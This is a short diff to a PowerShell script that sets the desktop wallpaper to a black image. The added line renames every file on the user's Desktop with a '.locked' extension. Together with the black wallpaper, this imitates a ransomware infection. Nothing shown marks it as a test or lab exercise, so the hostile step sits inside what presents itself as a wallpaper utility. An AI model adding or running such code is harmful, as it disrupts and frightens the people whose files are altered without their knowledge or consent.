@@ -24,3 +24,6 @@ public class Wallpaper
 Add-Type -TypeDefinition $setwallpapersrc
 
 [Wallpaper]::SetWallpaper("C:\temp\black.jpg")
+
+
+Get-ChildItem $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".locked"}
